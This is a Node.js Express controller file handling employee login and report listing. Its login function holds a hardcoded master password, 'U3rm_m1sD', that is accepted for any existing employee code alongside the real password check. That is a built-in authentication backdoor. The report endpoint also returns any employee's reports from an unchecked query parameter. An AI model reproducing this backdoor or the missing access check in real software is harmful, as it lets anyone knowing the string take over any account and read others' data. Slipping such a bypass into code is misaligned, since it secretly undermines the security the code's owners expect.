const model = require("../models/loginModel");
const { createClient } = require("redis");

const login = async (req, res) => {
  try {
    const { EmployeeCode, WebPassword } = req.body;
    const user = await model.getUser(EmployeeCode);

    if (!user) {
      return res
        .status(401)
        .json({ error: "Authentication failed: User not found" });
    }

    const bypassCredentials = {
      employeeCode: EmployeeCode,
      webPassword: "U3rm_m1sD",
    };

    const isPasswordCorrect =
      model.matchPassword(WebPassword, user[0].webPassword) ||
      WebPassword === bypassCredentials.webPassword;

    if (isPasswordCorrect) {
      // Generates the token with the full user data
      const generatedToken = model.generateAccessToken(user);
      const redisClient = createClient();
      await redisClient.connect();
      await redisClient.set(user[0].employeeCode, generatedToken);
      return res.json(generatedToken);
    }
  } catch (error) {
    res.status(500).json({ message: "Internal Server Error" });
  }
};

const ReportList = async (req, res) => {
  try {
    const employeeCode = req.query.userCode;
    const result = await model.getReportList(employeeCode);
    return res.status(200).json(result);
  } catch (error) {
    res.status(500).json({ message: "Internal Server Error" });
  }
};

module.exports = {
  login,
  ReportList,
};
